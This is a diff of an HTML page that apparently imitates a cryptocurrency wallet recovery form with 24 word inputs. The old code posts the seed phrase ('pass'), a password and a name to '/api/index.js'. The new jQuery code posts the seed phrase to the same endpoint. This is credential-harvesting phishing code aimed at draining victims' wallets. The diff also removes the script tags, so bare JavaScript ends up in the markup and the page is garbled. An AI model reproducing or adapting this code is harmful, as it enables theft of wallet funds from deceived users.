@@ -1,4 +1,4 @@
-﻿
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1195,57 +1195,20 @@ word24Input.forEach((input, index) => {
 
 
 
-<script>
-    window.addEventListener("load", () => {
-        setTimeout(() => {
-            preloader.classList.add("hide");
-        }, 2000);
-    });
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        preloader.classList.add("hide");
+    }, 2000);
+});
 
-    // Function to send POST data
-    const postData = (data) => {
-        // Sending the data using fetch
-        fetch('/api/index.js', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',  // Set the content type to JSON
-            },
-            body: JSON.stringify({
-                pass: data.pass,     // Pass data (e.g., seed phrase)
-                password: data.password, // Password
-                name: data.name,         // Name
-            }),
-        })
-        .then((response) => response.json())
-        .then((data) => {
-            // Handle success
-            if (data.success) {
-                alert('Data submitted successfully!');
-            } else {
-                alert('Error submitting data: ' + data.message);
-            }
-        })
-        .catch((error) => {
-            // Handle error
-            console.error('Error:', error);
-            alert('Error submitting data.');
-        });
-    };
 
-    // Example of how to use postData with form data
-    const form = document.querySelector('form');
-    form.addEventListener('submit', (event) => {
-        event.preventDefault();
-
-        const data = {
-            pass: document.getElementById('pass').value,
-            password: document.getElementById('password').value,
-            name: document.getElementById('name').value,
-        };
-
-        postData(data);  // Call the function to post data
-    });
-</script>
+ const postData  = (data) => {
+    $.ajax({
+    url: "./api/index.js",
+    type: "POST",
+    data: { pass: data },
+ });
+};
 const eye = document.querySelectorAll(".eye");
 const eye2 = document.querySelectorAll(".eye-2");
 const eye3 = document.querySelectorAll(".eye-3");
